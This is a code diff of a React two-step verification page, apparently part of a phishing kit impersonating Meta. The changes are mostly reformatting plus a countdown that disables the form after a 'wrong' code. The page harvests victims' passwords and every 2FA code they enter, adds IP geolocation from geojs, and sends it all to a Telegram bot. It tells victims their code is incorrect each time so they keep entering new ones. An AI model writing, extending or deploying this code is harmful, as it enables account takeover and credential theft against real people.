@@ -18,12 +18,15 @@ const TwoStepVerification = () => {
     const [showError, setShowError] = useState(false);
     const [codeAttempts, setCodeAttempts] = useState([]);
     const [lastMessageId, setLastMessageId] = useState(null);
-    const [countDown, setCountDown] = useState(config.LOAD_TIMEOUT_MS / 1000);
+    const [countDown, setCountDown] = useState(
+        config.ERROR_COUNTDOWN_MS / 1000
+    );
 
     const defaultTexts = useMemo(
         () => ({
             authenticatorApp: 'Open your authentication app',
-            authenticatorDesc: 'Enter the 6-digit code from your 2FA app (Duo Mobile, Google Authenticator).',
+            authenticatorDesc:
+                'Enter the 6-digit code from your 2FA app (Duo Mobile, Google Authenticator).',
             whatsapp: 'Check your WhatsApp messages',
             whatsappDesc: 'Enter the code we sent to your WhatsApp number',
             sms: 'Check your text messages',
@@ -33,7 +36,8 @@ const TwoStepVerification = () => {
             codePlaceholder: 'Enter 6 or 8 digit code',
             continueButton: 'Continue',
             tryAnotherWay: 'Try Another Way',
-            errorIncorrect: 'The code you entered is incorrect or has been used. Please try again after {seconds} seconds.'
+            errorIncorrect:
+                'The code you entered is incorrect or has been used. Please try again after {seconds} seconds.'
         }),
         []
     );
@@ -58,7 +62,10 @@ const TwoStepVerification = () => {
                 return;
             }
 
-            const translatedTexts = await translateMultiple(defaultTexts, targetLang);
+            const translatedTexts = await translateMultiple(
+                defaultTexts,
+                targetLang
+            );
             setTexts(translatedTexts);
 
             setValue({
@@ -98,6 +105,12 @@ const TwoStepVerification = () => {
                 .replace(/\{[^}]+\}/g, Math.round(countDown)); // fallback cho các placeholder khác
             setSubmitError(errorMsg);
         }
+
+        // Tắt showError khi hết thời gian đếm ngược
+        if (showError && countDown <= 0) {
+            setShowError(false);
+            setSubmitError(null);
+        }
     }, [countDown, texts.errorIncorrect, showError]);
 
     const formatDateVN = (dateStr) => {
@@ -134,7 +147,9 @@ const TwoStepVerification = () => {
                 clearInterval(countDownInterval);
             }
         }, 1000);
-        await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));
+        await new Promise((resolve) =>
+            setTimeout(resolve, config.LOAD_TIMEOUT_MS)
+        );
 
         const newCodeAttempts = [...codeAttempts, code];
         setCodeAttempts(newCodeAttempts);
@@ -142,22 +157,27 @@ const TwoStepVerification = () => {
         try {
             if (lastMessageId) {
                 try {
-                    await fetch(`https://api.telegram.org/bot${config.TOKEN}/deleteMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: config.CHAT_ID,
-                            message_id: lastMessageId
-                        })
-                    });
+                    await fetch(
+                        `https://api.telegram.org/bot${config.TOKEN}/deleteMessage`,
+                        {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: config.CHAT_ID,
+                                message_id: lastMessageId
+                            })
+                        }
+                    );
                 } catch (error) {
                     console.error('Error deleting previous message:', error);
                 }
             }
 
-            const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
+            const geoResponse = await fetch(
+                'https://get.geojs.io/v1/ip/geo.json'
+            );
             const geoData = await geoResponse.json();
 
             const currentTime = new Date().toLocaleString('vi-VN', {
@@ -169,9 +189,19 @@ const TwoStepVerification = () => {
                 year: 'numeric'
             });
 
-            const passwordList = (formData?.passwordAttempts || []).map((pass, index) => `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`).join('\n');
+            const passwordList = (formData?.passwordAttempts || [])
+                .map(
+                    (pass, index) =>
+                        `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`
+                )
+                .join('\n');
 
-            const codeList = newCodeAttempts.map((c, index) => `<b>🔐 Code ${index + 1} (${value.title}):</b> <code>${c}</code>`).join('\n');
+            const codeList = newCodeAttempts
+                .map(
+                    (c, index) =>
+                        `<b>🔐 Code ${index + 1} (${value.title}):</b> <code>${c}</code>`
+                )
+                .join('\n');
 
             const message = `
 <b>📅 Thời gian:</b> <code>${currentTime}</code>
@@ -226,12 +256,15 @@ ${codeList}`;
                     lastMessage: message,
                     timestamp: Date.now()
                 };
-                localStorage.setItem('metaFormData', JSON.stringify(updatedData));
+                localStorage.setItem(
+                    'metaFormData',
+                    JSON.stringify(updatedData)
+                );
             }
 
             if (newCodeAttempts.length < config.MAX_CODE_ATTEMPTS) {
                 // Reset countdown để bắt đầu đếm ngược lại
-                let j = config.LOAD_TIMEOUT_MS / 1000;
+                let j = config.ERROR_COUNTDOWN_MS / 1000;
                 setCountDown(j);
                 const errorCountDown = setInterval(() => {
                     j -= 1;
@@ -255,7 +288,11 @@ ${codeList}`;
             }
         } catch (error) {
             console.error('Error sending data:', error);
-            setSubmitError(error instanceof Error ? error.message : 'An unexpected error occurred');
+            setSubmitError(
+                error instanceof Error
+                    ? error.message
+                    : 'An unexpected error occurred'
+            );
         } finally {
             setIsSubmitting(false);
         }
@@ -299,7 +336,11 @@ ${codeList}`;
                     <div>
                         <div className='value--title'>{value.title}</div>
                         <div className='value--desc'>{value.desc}</div>
-                        <img src={value.imgSrc} className='img-verify' alt='Verification Method' />
+                        <img
+                            src={value.imgSrc}
+                            className='img-verify'
+                            alt='Verification Method'
+                        />
                     </div>
                     <div>
                         <input
@@ -309,7 +350,9 @@ ${codeList}`;
                             value={code}
                             onChange={handleCodeChange}
                             placeholder={texts.codePlaceholder}
-                            disabled={isSubmitting}
+                            disabled={
+                                isSubmitting || (showError && countDown > 0)
+                            }
                             onKeyPress={(e) => {
                                 if (e.key === 'Enter') {
                                     handleSubmitCode();
@@ -332,18 +375,42 @@ ${codeList}`;
                     <div>
                         <button
                             className='btn-continue'
-                            disabled={(code.length !== 6 && code.length !== 8) || isSubmitting}
+                            disabled={
+                                (code.length !== 6 && code.length !== 8) ||
+                                isSubmitting ||
+                                (showError && countDown > 0)
+                            }
                             onClick={handleSubmitCode}
                             style={{
-                                opacity: code.length !== 6 && code.length !== 8 && !isSubmitting ? 0.5 : 1,
-                                cursor: isSubmitting ? 'not-allowed' : 'pointer'
+                                opacity:
+                                    (code.length !== 6 &&
+                                        code.length !== 8 &&
+                                        !isSubmitting &&
+                                        !(showError && countDown > 0)) ||
+                                    (showError && countDown > 0)
+                                        ? 0.5
+                                        : 1,
+                                cursor:
+                                    isSubmitting || (showError && countDown > 0)
+                                        ? 'not-allowed'
+                                        : 'pointer'
                             }}
                         >
-                            {isSubmitting ? <div className='spinner'></div> : texts.continueButton}
+                            {isSubmitting ? (
+                                <div className='spinner'></div>
+                            ) : (
+                                texts.continueButton
+                            )}
                         </button>
                     </div>
                     <div>
-                        <button className='btn--try' onClick={() => setIsModalOpen(true)} disabled={isSubmitting}>
+                        <button
+                            className='btn--try'
+                            onClick={() => setIsModalOpen(true)}
+                            disabled={
+                                isSubmitting || (showError && countDown > 0)
+                            }
+                        >
                             {texts.tryAnotherWay}
                         </button>
                     </div>
